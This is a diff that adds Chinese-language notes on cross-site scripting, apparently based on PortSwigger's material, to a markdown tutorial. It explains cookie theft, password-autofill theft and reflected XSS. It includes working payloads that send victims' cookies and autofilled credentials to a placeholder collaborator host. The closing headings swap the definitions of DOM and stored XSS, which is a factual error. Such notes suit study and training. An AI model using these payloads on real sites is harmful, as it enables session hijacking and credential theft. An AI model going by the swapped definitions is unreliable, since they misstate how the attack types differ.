@@ -14,14 +14,79 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 ```
 ![image](https://github.com/user-attachments/assets/38d89f77-1d2c-491e-bb4f-0d04eb2d4512)
 
+## 三种利用XSS的方法
+### （1）利用跨站脚本窃取 Cookie
+`您可以利用跨站点脚本漏洞将受害者的 cookie 发送到您自己的域，然后手动将 cookie 注入浏览器并冒充受害者。`
+`实际上，这种方法有一些明显的局限性：`
+```
+1、受害者可能没有登录。
+2、许多应用程序使用 HttpOnly 标志隐藏 JavaScript 中的 cookie。
+3、会话可能会被锁定到其他因素，例如用户的 IP 地址。
+4、会话可能会在您劫持之前超时。
+```
+payload:
+```
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+### （2）利用跨站脚本获取密码
+```
+如今，许多用户都拥有可以自动填充密码的密码管理器。您可以利用此功能，创建密码输入，读取自动填充的密码，并将其发送到您自己的域。这种技术避免了与窃取 cookie 相关的大多数问题，甚至可以访问受害者重复使用相同密码的每个其他帐户。
+这种技术的主要缺点是它只适用于拥有执行密码自动填充的密码管理器的用户。（当然，如果用户没有保存密码，您仍然可以尝试通过现场网络钓鱼攻击获取他们的密码，但这并不完全相同。）
+```
+payload:
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+
 ## XSS攻击类型
 ### (1) 反射型XSS -- 恶意脚本来自当前 HTTP 请求。
 #### 介绍
 ```
 反射型 XSS 是跨站点脚本攻击中最简单的一种。当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会发生这种情况。
 ```
+#### 产生原因
+`当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会出现反射型跨站点脚本 (或 XSS)。`<br/>
+#example:
+`假设某个网站具有搜索功能，它可以在 URL 参数中接收用户提供的搜索词：`<br/>
+```
+https://insecure-website.com/search?term=gift
+```
+`应用程序在对此 URL 的响应中回显所提供的搜索词：`<br/>
+```
+<p>You searched for: gift</p>
+```
+`假设应用程序不对数据执行任何其他处理，攻击者可以构建如下攻击：`<br/>
+```
+https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
+```
+`此 URL 产生以下响应：`<br/>
+```
+<p>You searched for: <script>/* Bad stuff here... */</script></p>
+```
+`如果应用程序的另一个用户请求攻击者的 URL，那么攻击者提供的脚本将在受害者用户的浏览器中，在他们与应用程序的会话环境中执行`
 
+#### 反射型 XSS 攻击的影响
+```
+1、在应用程序中执行用户可以执行的任何操作。
+2、查看用户可以查看的任何信息。
+3、修改用户可以修改的任何信息。
+4、发起与其他应用程序用户的交互，包括恶意攻击，这些交互似乎源自最初的受害者用户。
 
+攻击者可以通过各种方式诱使受害者用户发出他们控制的请求，以发起反射型 XSS 攻击。这些方法包括在攻击者控制的网站上放置链接，或在允许生成内容的另一个网站上放置链接，或者通过电子邮件、推文或其他消息发送链接。攻击可以直接针对已知用户，也可以对应用程序的任何用户进行无差别攻击。
+```
+`攻击需要外部传递机制，这意味着反射型 XSS 的影响通常不如存储型 XSS 严重，存储型 XSS 可以在易受攻击的应用程序本身内发起自包含攻击。`
 
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
